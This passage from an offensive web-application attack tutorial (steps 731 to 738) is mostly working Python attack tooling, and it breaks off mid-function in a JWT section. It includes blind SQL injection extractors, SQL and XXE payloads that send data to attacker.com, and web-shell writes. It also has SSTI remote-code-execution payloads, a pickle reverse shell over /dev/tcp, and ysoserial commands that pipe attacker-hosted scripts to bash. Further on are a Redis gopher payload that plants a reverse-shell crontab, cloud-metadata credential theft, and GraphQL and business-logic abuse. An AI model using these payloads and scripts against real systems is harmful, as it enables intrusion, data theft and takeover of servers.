# Part 74: Advanced Web Application Attacks (Steps 731-740)

## Step 731: Advanced SQL Injection

```python
#!/usr/bin/env python3
# Advanced SQL injection techniques

import requests
import time
import string
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class AdvancedSQLInjection:
    """Advanced SQL injection techniques"""
    target_url: str
    session: requests.Session = field(default_factory=requests.Session)
    
    def blind_boolean_injection(self, param: str, query_template: str) -> str:
        """Blind boolean-based SQL injection"""
        extracted = ""
        for pos in range(1, 50):
            low, high = 0, 127
            while low < high:
                mid = (low + high) // 2
                payload = f"' AND ASCII(SUBSTRING(({query_template}),{pos},1))>{mid}-- -"
                params = {param: payload}
                resp = self.session.get(self.target_url, params=params)
                if self._is_true_condition(resp):
                    low = mid + 1
                else:
                    high = mid
            if low == 0:
                break
            extracted += chr(low)
            print(f"\r[+] Extracting: {extracted}", end="", flush=True)
        print()
        return extracted
    
    def time_based_injection(self, param: str, query_template: str) -> str:
        """Time-based blind SQL injection"""
        extracted = ""
        for pos in range(1, 50):
            for char_code in range(32, 127):
                # MySQL: IF condition triggers sleep
                payload = (
                    f"' AND IF(ASCII(SUBSTRING(({query_template}),{pos},1))={char_code},"
                    f"SLEEP(2),0)-- -"
                )
                params = {param: payload}
                start = time.time()
                self.session.get(self.target_url, params=params, timeout=5)
                elapsed = time.time() - start
                
                if elapsed >= 2.0:
                    extracted += chr(char_code)
                    print(f"\r[+] Extracting: {extracted}", end="", flush=True)
                    break
            else:
                break
        print()
        return extracted
    
    def out_of_band_injection(self) -> Dict:
        """Out-of-band SQL injection via DNS"""
        return {
            "mysql": [
                # Load file to trigger DNS (MySQL)
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.',attacker.com,'\\\\foo'))-- -",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -",
            ],
            "mssql": [
                # DNS lookup via xp_dirtree
                "'; EXEC master..xp_dirtree '\\\\attacker.com\\share';-- ",
                "'; DECLARE @q NVARCHAR(200); SET @q='\\\\'+@@version+'.attacker.com\\share'; EXEC xp_dirtree @q;-- ",
            ],
            "oracle": [
                # Oracle UTL_HTTP
                "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1)) FROM DUAL-- ",
            ]
        }
    
    def stacked_queries(self) -> Dict:
        """Stacked queries for code execution"""
        return {
            "mssql_code_exec": [
                "'; EXEC xp_cmdshell 'whoami';-- ",
                "'; EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD';-- ",
                # Enable xp_cmdshell if disabled
                "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- ",
            ],
            "postgresql_exec": [
                "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out';-- ",
                "'; CREATE TABLE shell (output text); COPY shell FROM PROGRAM 'id';-- ",
            ],
            "mysql_file_write": [
                "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- ",
                "'; SELECT 0x3c3f7068702073797374656d28245f47455... INTO DUMPFILE '/var/www/html/s.php';-- ",
            ]
        }
    
    def second_order_injection(self) -> Dict:
        """Second-order SQL injection"""
        return {
            "description": "Malicious input stored in DB, injected on retrieval",
            "example": {
                "step1": "Register username: admin'--",
                "step2": "Application stores raw value in DB",
                "step3": "Password change: UPDATE users SET pwd='new' WHERE user='admin'--",
                "result": "Password of 'admin' changed, not 'admin'--'"
            },
            "test_payload": "admin'-- or admin' OR '1'='1"
        }
    
    def _is_true_condition(self, response: requests.Response) -> bool:
        """Determine if SQL condition evaluated to true"""
        return len(response.text) > 1000  # Simplified heuristic


@dataclass
class SQLMapAutomation:
    """SQLMap automation"""
    
    def generate_sqlmap_command(self, url: str, param: str = None, 
                                 method: str = "GET", data: str = None,
                                 headers: Dict = None, options: List = None) -> str:
        """Generate SQLMap command with options"""
        cmd = f"sqlmap -u '{url}'"
        
        if param:
            cmd += f" -p {param}"
        if method == "POST" and data:
            cmd += f" --data '{data}'"
        if headers:
            for k, v in headers.items():
                cmd += f" --header '{k}: {v}'"
        
        # Common options
        cmd += " --batch"  # Non-interactive
        cmd += " --level 5 --risk 3"  # Thorough testing
        cmd += " --dbms=mysql"  # Specify DBMS if known
        cmd += " --dbs"  # Enumerate databases
        cmd += " --tables"  # Enumerate tables
        cmd += " --dump"  # Dump data
        
        if options:
            cmd += " " + " ".join(options)
        
        return cmd
    
    def sqlmap_advanced_options(self) -> Dict:
        """SQLMap advanced usage options"""
        return {
            "os_shell": "--os-shell  # Get OS shell via SQL",
            "file_read": "--file-read=/etc/passwd",
            "file_write": "--file-write=./shell.php --file-dest=/var/www/html/shell.php",
            "technique_filter": "--technique=BEUSTQ  # B=bool U=union E=error S=stack T=time Q=inline",
            "tamper": "--tamper=space2comment,charencode  # Bypass WAF",
            "tor": "--tor --tor-type=SOCKS5  # Route through Tor",
            "auth": "--auth-type=basic --auth-cred='user:pass'",
            "cookies": "--cookie='PHPSESSID=abc123'",
            "proxy": "--proxy=http://127.0.0.1:8080  # Through Burp",
            "forms": "-u http://site.com/login --forms --crawl=3",
        }


if __name__ == '__main__':
    sqli = AdvancedSQLInjection("http://target.com/search")
    
    oob = sqli.out_of_band_injection()
    print(f"[+] Out-of-band injection payloads:")
    for db, payloads in oob.items():
        print(f"    {db}: {len(payloads)} payloads")
    
    stacked = sqli.stacked_queries()
    print(f"\n[+] Stacked query RCE:")
    for db, payloads in stacked.items():
        print(f"    {db}: {payloads[0][:60]}...")
    
    sqlmap = SQLMapAutomation()
    cmd = sqlmap.generate_sqlmap_command("http://target.com/search?q=test", param="q")
    print(f"\n[+] SQLMap command: {cmd[:100]}...")
```

## Step 732: Server-Side Template Injection (SSTI)

```python
#!/usr/bin/env python3
# Server-Side Template Injection attacks

import requests
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class SSTIAttacker:
    """SSTI detection and exploitation"""
    target_url: str
    session: requests.Session = field(default_factory=requests.Session)
    
    # Detection payloads (each evaluates differently per engine)
    DETECTION_PAYLOADS = [
        "{{7*7}}",           # Jinja2, Twig -> 49
        "${7*7}",            # Freemarker, Thymeleaf -> 49
        "#{7*7}",            # Ruby ERB
        "*{7*7}",            # Spring Expression Language
        "{{7*'7'}}",         # Jinja2 -> 7777777, Twig -> 49
        "${{7*7}}",          # Jinja2 safe, pebble
        "{@math key=\"result\" method=\"round\" operand1=5 operand2=3}",  # Apache Velocity
    ]
    
    def detect_ssti(self, param: str, method: str = "GET") -> Optional[str]:
        """Detect SSTI vulnerability"""
        for payload in self.DETECTION_PAYLOADS:
            if method == "GET":
                resp = self.session.get(self.target_url, params={param: payload})
            else:
                resp = self.session.post(self.target_url, data={param: payload})
            
            if "49" in resp.text:
                if payload == "{{7*'7'}}":
                    print(f"[+] Jinja2/Twig SSTI detected")
                    return "jinja2"
                print(f"[+] SSTI detected with payload: {payload}")
                return "unknown"
        return None
    
    def jinja2_exploitation(self) -> Dict:
        """Jinja2 SSTI exploitation payloads"""
        payloads = {
            "basic_rce": [
                # Using config object
                "{{config.items()}}",
                # MRO-based RCE
                "{{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS_INDEX](['id'],stdout=-1).communicate()}}",
                # Simplified
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                # cycler-based
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                # lipsum-based
                "{{lipsum.__globals__['os'].popen('id').read()}}",
                # namespace-based
                "{{namespace.__init__.__globals__.os.popen('id').read()}}",
            ],
            "filter_bypass": [
                # Bypass _ filter using request
                '{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}',
                # Format strings bypass
                "{{'%c'%(95)+'%c'%(95)+'class'+'%c'%(95)+'%c'%(95)}}",
            ],
            "read_file": [
                "{{''.__class__.__mro__[1].__subclasses__()[OPEN_INDEX]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}",
            ]
        }
        return payloads
    
    def twig_exploitation(self) -> Dict:
        """Twig (PHP) SSTI exploitation"""
        return {
            "rce": [
                "{{['id']|filter('system')}}",
                "{{['id']|map('system')|join}}",
                "{{'id'|passthru}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ],
            "detect": "{{7*'7'}} -> 49 (not 7777777 like Jinja2)"
        }
    
    def freemarker_exploitation(self) -> Dict:
        """Freemarker SSTI exploitation"""
        return {
            "rce": [
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                '${"freemarker.template.utility.Execute"?new()("id")}',
                '<#assign classLoader=object?api.class.protectionDomain.classLoader><#assign owc=classLoader.loadClass("freemarker.template.ObjectWrapper")>',
            ],
            "read_file": [
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation()}',
            ]
        }
    
    def ssti_to_rce_workflow(self) -> List[str]:
        """SSTI to RCE exploitation workflow"""
        return [
            "1. Identify template injection point (form input, header, URL param)",
            "2. Test basic math: {{7*7}}, ${7*7}, #{7*7}",
            "3. Identify template engine from error messages or behavior",
            "4. Use engine-specific payload for RCE",
            "5. Read /etc/passwd, /etc/shadow",
            "6. Write SSH key or web shell",
            "7. Establish reverse shell",
        ]


if __name__ == '__main__':
    ssti = SSTIAttacker("http://target.com/search")
    print(f"[+] SSTI detection payloads: {len(ssti.DETECTION_PAYLOADS)}")
    
    jinja2 = ssti.jinja2_exploitation()
    print(f"\n[+] Jinja2 RCE payloads: {len(jinja2['basic_rce'])}")
    print(f"    Best payload: {jinja2['basic_rce'][2][:60]}...")
    
    workflow = ssti.ssti_to_rce_workflow()
    print("\n[+] Exploitation workflow:")
    for step in workflow:
        print(f"    {step}")
```

## Step 733: XML External Entity (XXE) Injection

```python
#!/usr/bin/env python3
# XXE injection attacks

import requests
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class XXEAttacker:
    """XXE injection techniques"""
    target_url: str
    session: requests.Session = field(default_factory=requests.Session)
    
    def basic_xxe_file_read(self, file_path: str = "/etc/passwd") -> str:
        """Basic XXE for file reading"""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>
'''
        return payload
    
    def blind_xxe_oob(self, attacker_domain: str) -> Dict:
        """Out-of-band XXE for blind scenarios"""
        # Parameter entity for exfiltration
        payload_attacker_dtd = f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://{attacker_domain}/?data=%file;'>">
%exfil;
%send;
'''
        
        # XXE payload referencing attacker's DTD
        xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://{attacker_domain}/evil.dtd">
  %remote;
]>
<root>test</root>
'''
        
        # Error-based XXE (file contents in error message)
        error_based = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
'''
        
        return {
            "attacker_dtd": payload_attacker_dtd,
            "xxe_trigger": xxe_payload,
            "error_based": error_based
        }
    
    def xxe_ssrf(self) -> List[str]:
        """XXE to SSRF for internal services"""
        targets = [
            # AWS metadata
            '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">',
            '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">',
            # Internal services
            '<!ENTITY xxe SYSTEM "http://internal-service.local/api/secret">',
            '<!ENTITY xxe SYSTEM "http://localhost:8080/admin">',
            # File read with different protocols
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">',
            '<!ENTITY xxe SYSTEM "http://localhost/server-status">',
            # PHP wrappers
            '<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">',
            '<!ENTITY xxe SYSTEM "expect://id">',  # PHP expect wrapper (RCE)
        ]
        return targets
    
    def xxe_bypass_techniques(self) -> Dict:
        """Bypass XXE mitigations"""
        return {
            "json_to_xml": {
                "description": "Application accepts JSON but processes XML internally",
                "header_change": "Content-Type: application/xml",
                "payload_conversion": "Change JSON to XML format"
            },
            "base64_encoding": "Use base64 encoding of DTD content",
            "parameter_entities": [
                "Use % instead of & for parameter entities",
                "Works in DOCTYPE even when regular entities blocked"
            ],
            "xinclude": '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',
            "svg_xxe": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>''',
            "office_docs": "XXE in XML-based Office documents (docx, xlsx)"
        }


if __name__ == '__main__':
    xxe = XXEAttacker("http://target.com/api/xml")
    
    basic = xxe.basic_xxe_file_read()
    print(f"[+] Basic XXE payload:\n{basic}")
    
    oob = xxe.blind_xxe_oob("attacker.com")
    print(f"[+] OOB XXE DTD file:\n{oob['attacker_dtd']}")
    
    ssrf_targets = xxe.xxe_ssrf()
    print(f"[+] SSRF targets via XXE: {len(ssrf_targets)}")
    print(f"    AWS metadata: {ssrf_targets[0]}")
```

## Step 734: Insecure Deserialization

```python
#!/usr/bin/env python3
# Insecure deserialization exploits

import pickle
import os
import base64
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class DeserializationExploit:
    """Insecure deserialization attacks"""
    
    def python_pickle_exploit(self, command: str) -> bytes:
        """Python pickle deserialization RCE"""
        class MaliciousPickle:
            def __reduce__(self):
                return (os.system, (command,))
        
        return pickle.dumps(MaliciousPickle())
    
    def python_pickle_reverse_shell(self, lhost: str, lport: int) -> bytes:
        """Pickle payload for reverse shell"""
        cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        class RevShell:
            def __reduce__(self):
                return (os.system, (cmd,))
        encoded = base64.b64encode(pickle.dumps(RevShell())).decode()
        return encoded
    
    def java_deserialization(self) -> Dict:
        """Java deserialization attacks"""
        return {
            "ysoserial": {
                "download": "wget https://github.com/frohoff/ysoserial/releases/download/latest/ysoserial-all.jar",
                "payloads": [
                    "java -jar ysoserial-all.jar CommonsCollections1 'id' | base64",
                    "java -jar ysoserial-all.jar CommonsCollections3 'curl http://attacker.com/shell.sh | bash' | base64",
                    "java -jar ysoserial-all.jar CommonsCollections5 'wget -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh'",
                    "java -jar ysoserial-all.jar Jdk7u21 'ping -c 1 attacker.com' | base64",
                ],
                "gadget_chains": [
                    "CommonsCollections1-7",
                    "Spring1, Spring2",
                    "Jdk7u21, Jdk8u20",
                    "Clojure",
                    "Groovy1, Groovy2"
                ]
            },
            "vulnerable_apps": [
                "Apache Struts (CVE-2017-9805, CVE-2018-11776)",
                "Jenkins (CVE-2015-8103, CVE-2016-0788)",
                "JBoss/Wildfly",
                "WebLogic (CVE-2015-4852)",
                "Apache Commons Collections",
                "Spring Framework",
            ]
        }
    
    def php_deserialization(self) -> Dict:
        """PHP deserialization attacks"""
        php_gadget = '''<?php
// PHP POP chain gadget example
class FileWrite {
    public $filename;
    public $content;
    
    function __destruct() {
        // Triggered on unserialize/object destruction
        file_put_contents($this->filename, $this->content);
    }
}

// Create malicious object
$payload = new FileWrite();
$payload->filename = "/var/www/html/shell.php";
$payload->content = "<?php system($_GET['cmd']); ?>";

// Serialize
$serialized = serialize($payload);
echo base64_encode($serialized);
// Output: <BASE64> - send in Cookie or parameter
?>
'''
        
        # PHP unserialize magic methods
        magic_methods = [
            "__wakeup() - called on unserialize",
            "__destruct() - called on object destruction",
            "__toString() - called when object used as string",
            "__invoke() - called when object invoked as function",
            "__get/__set - property access",
        ]
        
        return {
            "gadget_example": php_gadget,
            "magic_methods": magic_methods,
            "tools": ["phpggc", "PHPCS Fixer"],
            "phpggc_usage": "phpggc Laravel/RCE1 system 'id' -b"
        }
    
    def dotnet_deserialization(self) -> Dict:
        """ASP.NET deserialization attacks"""
        return {
            "formats": [
                "BinaryFormatter",
                "NetDataContractSerializer",
                "DataContractSerializer",
                "XmlSerializer",
                "JSON.NET (with TypeNameHandling)",
            ],
            "tools": [
                "ysoserial.net",
                "ExploitRemotingService"
            ],
            "ysoserial_commands": [
                "ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c 'cmd /c calc'",
                "ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c 'cmd /c id > C:/out.txt'",
                "ysoserial.exe -f LosFormatter -g ObjectDataProvider -o base64 -c 'id'",
            ]
        }


if __name__ == '__main__':
    deser = DeserializationExploit()
    
    # Python pickle exploit
    payload = deser.python_pickle_exploit("id")
    print(f"[+] Pickle payload: {payload[:30]}...")
    
    # Reverse shell payload
    encoded = deser.python_pickle_reverse_shell("192.168.1.100", 4444)
    print(f"[+] Rev shell payload (b64): {encoded[:50]}...")
    
    java = deser.java_deserialization()
    print(f"\n[+] Java gadget chains: {java['ysoserial']['gadget_chains']}")
    
    php = deser.php_deserialization()
    print(f"[+] PHP magic methods: {len(php['magic_methods'])}")
    print(f"[+] phpggc command: {php['phpggc_usage']}")
```

## Step 735: Server-Side Request Forgery (SSRF)

```python
#!/usr/bin/env python3
# Advanced SSRF exploitation

import requests
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class SSRFExploit:
    """SSRF exploitation techniques"""
    target_url: str
    ssrf_param: str
    session: requests.Session = field(default_factory=requests.Session)
    
    # Internal services to probe
    INTERNAL_TARGETS = [
        "http://127.0.0.1:22",         # SSH
        "http://127.0.0.1:25",         # SMTP
        "http://127.0.0.1:3306",       # MySQL
        "http://127.0.0.1:5432",       # PostgreSQL
        "http://127.0.0.1:6379",       # Redis
        "http://127.0.0.1:27017",      # MongoDB
        "http://127.0.0.1:8080",       # Web server
        "http://127.0.0.1:9200",       # Elasticsearch
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://169.254.169.254/metadata/instance",  # Azure metadata
    ]
    
    def cloud_metadata_exfil(self) -> Dict:
        """Exfiltrate cloud metadata via SSRF"""
        return {
            "aws": {
                "metadata_url": "http://169.254.169.254/latest/meta-data/",
                "iam_keys": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "user_data": "http://169.254.169.254/latest/user-data",
                "imdsv2": "PUT http://169.254.169.254/latest/api/token (token required in IMDSv2)",
                "critical_endpoints": [
                    "http://169.254.169.254/latest/meta-data/hostname",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
                    "http://169.254.169.254/latest/dynamic/instance-identity/document",
                ]
            },
            "gcp": {
                "metadata_url": "http://metadata.google.internal/computeMetadata/v1/",
                "required_header": "Metadata-Flavor: Google",
                "service_account": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "ssh_keys": "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
            },
            "azure": {
                "metadata_url": "http://169.254.169.254/metadata/instance",
                "required_header": "Metadata: true",
                "access_token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            }
        }
    
    def ssrf_bypass_techniques(self) -> Dict:
        """Bypass SSRF filtering"""
        return {
            "ip_obfuscation": [
                "Decimal: http://2130706433/  (127.0.0.1)",
                "Octal: http://0177.0.0.1/",
                "Hex: http://0x7f000001/",
                "Mixed: http://127.0.0x1/",
                "IPv6: http://[::1]/",
                "Abbreviated: http://127.1/",
                "URL encoding: http://127.0.0.1%2F%40attacker.com/",
            ],
            "host_header_bypass": [
                "http://attacker.com@127.0.0.1/",
                "http://127.0.0.1:80@attacker.com/",
            ],
            "protocol_bypass": [
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",  # Redis
                "dict://127.0.0.1:6379/info",
                "ldap://127.0.0.1:389/",
                "ftp://127.0.0.1:21/",
                "sftp://127.0.0.1:22/",
                "tftp://127.0.0.1:69/",
            ],
            "dns_rebinding": [
                "Use DNS rebinding to bypass IP validation",
                "First request: attacker.com -> legitimate IP",
                "Second request: attacker.com -> 127.0.0.1",
            ],
            "redirect_bypass": [
                "Host endpoint that redirects to internal IP",
                "Location: http://127.0.0.1/admin",
            ]
        }
    
    def redis_ssrf_exploit(self, attacker_host: str, attacker_port: int) -> str:
        """Exploit Redis via SSRF for RCE"""
        # Gopher protocol to send Redis commands
        redis_cmd = f"""*3\r\n$3\r\nSET\r\n$1\r\nk\r\n$50\r\n\n\n*/1 * * * * root bash -i >& /dev/tcp/{attacker_host}/{attacker_port} 0>&1\n\n\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$4\r\n/etc\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\ncrontab\r\n*1\r\n$4\r\nSAVE\r\n"""
        
        # URL encode for gopher
        encoded = redis_cmd.replace('\r\n', '%0d%0a').replace(' ', '%20').replace('*', '%2a').replace('$', '%24')
        gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
        
        return gopher_url


if __name__ == '__main__':
    ssrf = SSRFExploit("http://target.com/api/fetch", "url")
    
    print(f"[+] Internal services to probe: {len(ssrf.INTERNAL_TARGETS)}")
    
    cloud = ssrf.cloud_metadata_exfil()
    print(f"\n[+] Cloud metadata endpoints:")
    for provider, data in cloud.items():
        print(f"    {provider}: {data['metadata_url']}")
    
    bypass = ssrf.ssrf_bypass_techniques()
    print(f"\n[+] IP obfuscation techniques: {len(bypass['ip_obfuscation'])}")
    for ip in bypass['ip_obfuscation']:
        print(f"    {ip}")
```

## Step 736: GraphQL Security Testing

```python
#!/usr/bin/env python3
# GraphQL security testing

import requests
import json
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class GraphQLTester:
    """GraphQL security testing"""
    target_url: str
    session: requests.Session = field(default_factory=requests.Session)
    
    def introspection_query(self) -> Dict:
        """Run introspection to enumerate schema"""
        query = '''{  __schema {    types {      name      kind      fields {        name        args {          name          type {            name            kind          }        }        type {          name          kind        }      }    }  }}'''
        
        resp = self.session.post(self.target_url, json={"query": query})
        return resp.json()
    
    def graphql_injection_tests(self) -> Dict:
        """GraphQL injection tests"""
        return {
            "sql_injection": [
                '{user(id: "1 OR 1=1") { name email }}',
                '{user(id: "1; DROP TABLE users;--") { name }}',
                '{searchProducts(keyword: "\' OR \'1\'=\'1") { name price }}',
            ],
            "nosql_injection": [
                '{user(id: {$gt: ""}) { name email }}',
                '{login(username: "admin", password: {$gt: ""}) { token }}',
            ],
            "idor_test": [
                "{user(id: 1) { email privateData }}",
                "{order(id: 1000) { creditCard amount }}",
            ],
            "batch_attack": [
                # Batch requests for brute force
                '[{"query":"{login(user:\"admin\",pass:\"password1\"){token}}"},'
                '{"query":"{login(user:\"admin\",pass:\"password2\"){token}}"}]'
            ],
            "introspection_enabled": "Introspection should be disabled in production",
            "dos_depth": "{user{friends{friends{friends{friends{friends{name}}}}}}}",  # Deep nesting
        }
    
    def graphql_mutation_attacks(self) -> List[str]:
        """Malicious GraphQL mutations"""
        return [
            # IDOR via mutation
            '''mutation { updateUser(id: 999, data: { email: "attacker@evil.com" }) { id email } }''',
            # Privilege escalation  
            '''mutation { updateUser(id: 1, data: { role: "ADMIN" }) { id role } }''',
            # Mass data exfiltration
            '''{ users { id name email password ssn creditCard { number expiry cvv } } }''',
            # Batch mutations
            '''mutation { m1: deleteUser(id: 1) { id }  m2: deleteUser(id: 2) { id } }''',
        ]
    
    def clairvoyance_wordlist(self) -> List[str]:
        """Common GraphQL field names for enumeration"""
        return [
            "user", "users", "admin", "admins", "getUser", "login", "logout",
            "createUser", "updateUser", "deleteUser", "password", "token",
            "secret", "private", "internal", "sensitiveData", "creditCard",
            "ssn", "apiKey", "webhook", "config", "setting",
        ]
    
    def graphql_tools(self) -> Dict:
        """Tools for GraphQL testing"""
        return {
            "graphiql": "In-browser IDE (check /graphiql)",
            "voyager": "Visual schema explorer",
            "graphql-cop": "python3 graphql-cop.py -t http://target/graphql",
            "clairvoyance": "python3 clairvoyance.py -o schema.json http://target/graphql",
            "burp_graphql_scanner": "Burp Suite Pro extension",
            "inql": "python3 inql --target http://target/graphql",
        }


if __name__ == '__main__':
    gql = GraphQLTester("http://target.com/graphql")
    
    tests = gql.graphql_injection_tests()
    print(f"[+] GraphQL injection tests:")
    for category, payloads in tests.items():
        if isinstance(payloads, list):
            print(f"    {category}: {len(payloads)} payloads")
    
    mutations = gql.graphql_mutation_attacks()
    print(f"\n[+] Malicious mutations: {len(mutations)}")
    print(f"    IDOR: {mutations[0][:60]}...")
    
    tools = gql.graphql_tools()
    print(f"\n[+] GraphQL testing tools: {list(tools.keys())}")
```

## Step 737: Business Logic Vulnerabilities

```python
#!/usr/bin/env python3
# Business logic vulnerability testing

import requests
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class BusinessLogicTester:
    """Business logic vulnerability testing"""
    target_url: str
    session: requests.Session = field(default_factory=requests.Session)
    
    def race_condition_test(self, endpoint: str, data: Dict, num_requests: int = 20) -> Dict:
        """Test for race condition vulnerabilities"""
        import concurrent.futures
        import time
        
        results = []
        
        def send_request(req_data):
            resp = self.session.post(endpoint, json=req_data)
            return resp.status_code, resp.json() if resp.headers.get('content-type', '').startswith('application/json') else resp.text[:100]
        
        # Send requests concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
            futures = [executor.submit(send_request, data) for _ in range(num_requests)]
            for f in concurrent.futures.as_completed(futures):
                results.append(f.result())
        
        success_count = sum(1 for r in results if r[0] == 200)
        
        return {
            "total_requests": num_requests,
            "successful": success_count,
            "race_condition_detected": success_count > 1,
            "note": f"If {success_count} > 1 success, race condition exists"
        }
    
    def negative_price_test(self) -> Dict:
        """Test for negative price/quantity vulnerabilities"""
        test_cases = [
            {"quantity": -1, "item_id": 1},   # Negative quantity
            {"quantity": 0, "item_id": 1},    # Zero quantity
            {"price": -100, "item_id": 1},    # Negative price
            {"amount": -9999, "action": "purchase"},  # Negative amount transfer
            {"coupon": "DISCOUNT", "quantity": -1},   # Negative with coupon
        ]
        return {
            "test_cases": test_cases,
            "expected_impact": "Negative price may credit attacker's account",
            "vulnerable_example": "POST /cart/add {quantity: -1, item_id: 123}"
        }
    
    def coupon_abuse(self) -> Dict:
        """Coupon and discount abuse testing"""
        return {
            "single_use_bypass": [
                "Apply same coupon in multiple concurrent requests (race condition)",
                "Apply before completing purchase (timing attack)",
                "Different case variations: DISCOUNT, discount, Discount",
                "URL encode: DISC%4FUNT",
            ],
            "coupon_stacking": [
                "Apply multiple exclusive coupons simultaneously",
                "Combine employee discount + public coupon",
            ],
            "workflow": [
                "1. Add items to cart",
                "2. Apply coupon",
                "3. Remove item that qualified for coupon",
                "4. Add different items - does discount remain?"
            ]
        }
    
    def account_takeover_flows(self) -> Dict:
        """Account takeover via business logic"""
        return {
            "password_reset_flaws": [
                "Predictable tokens (MD5 of username/time)",
                "Token not invalidated after use",
                "Token in URL logged in server logs",
                "Host header injection in reset email",
                "Race condition: reset then login before token invalidation",
            ],
            "oauth_flaws": [
                "state parameter not validated (CSRF)",
                "Implicit grant with redirect_uri manipulation",
                "Account linking without email verification",
                "Pre-account takeover via email claim",
            ],
            "mfa_bypass": [
                "Skip MFA step in multi-step login",
                "Reuse MFA code (not single-use)",
                "Use backup code brute force",
                "MFA not applied to API endpoints",
                "Direct API call bypassing frontend MFA",
            ]
        }
    
    def price_manipulation(self) -> Dict:
        """Price manipulation through request tampering"""
        return {
            "approaches": [
                "Modify price parameter in POST request",
                "Tamper with cart total in hidden fields",
                "Modify item price in cart update request",
                "Currency conversion manipulation",
                "Floating point rounding exploitation",
            ],
            "test_case": {
                "original_request": 'POST /checkout {"items":[{"id":1,"price":99.99,"qty":1}]}',
                "modified_request": 'POST /checkout {"items":[{"id":1,"price":0.01,"qty":1}]}'
            }
        }


if __name__ == '__main__':
    bl_tester = BusinessLogicTester("http://target.com")
    
    print("[+] Business logic vulnerability categories:")
    categories = [
        "Race conditions", "Negative values", "Coupon abuse",
        "Price manipulation", "Account takeover flows", "MFA bypass"
    ]
    for cat in categories:
        print(f"    - {cat}")
    
    neg_price = bl_tester.negative_price_test()
    print(f"\n[+] Negative price test cases: {len(neg_price['test_cases'])}")
    
    ato = bl_tester.account_takeover_flows()
    print(f"[+] MFA bypass techniques: {len(ato['mfa_bypass'])}")
```

## Step 738: OAuth 2.0 & JWT Attacks

```python
#!/usr/bin/env python3
# OAuth 2.0 and JWT attacks

import base64
import json
import hmac
import hashlib
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class OAuthJWTAttacker:
    """OAuth 2.0 and JWT vulnerability testing"""
    
    def decode_jwt(self, token: str) -> Dict:
        """Decode JWT without verification"""
        parts = token.split('.')
        if len(parts) != 3:
            return {'error': 'Invalid JWT format'}
        
        def b64_decode(data):
            padding = 4 - len(data) % 4
            data += '=' * padding
            return json.loads(base64.urlsafe_b64decode(data))
        
        return {
            'header': b64_decode(parts[0]),
